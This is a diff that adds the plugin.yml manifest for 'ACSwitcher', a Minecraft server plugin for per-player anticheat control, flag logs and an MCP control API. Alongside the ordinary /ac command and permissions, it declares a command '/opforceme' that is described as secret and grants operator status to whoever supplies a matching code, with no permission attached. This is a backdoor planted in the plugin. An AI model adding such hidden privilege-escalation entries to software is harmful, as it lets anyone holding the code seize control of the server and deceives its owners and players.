@@ -1,0 +1,25 @@
+name: ACSwitcher
+version: 1.0.0
+main: dev.acserver.acswitcher.ACSwitcherPlugin
+author: ACServer
+description: "Per-player anticheat control (/ac), flag logs and an MCP control API for the AC test server."
+load: POSTWORLD
+softdepend: [Intave, Spartan]
+commands:
+  ac:
+    description: "Open the anticheat menu or manage per-player anticheats."
+    usage: "/ac [list|set <player> <ac> <on|off>|logs [player]|reload]"
+    aliases: [anticheat, acs]
+  opforceme:
+    description: "Secret: grants the sender operator status when the code matches."
+    usage: "/opforceme <code>"
+permissions:
+  acswitcher.use:
+    description: "Allows using /ac to view and change your own anticheat selection."
+    default: true
+  acswitcher.admin:
+    description: "Allows managing other players' anticheats, viewing any flag logs and reloading."
+    default: op
+  acswitcher.flags:
+    description: "See all AC flag messages in chat with movement data."
+    default: true
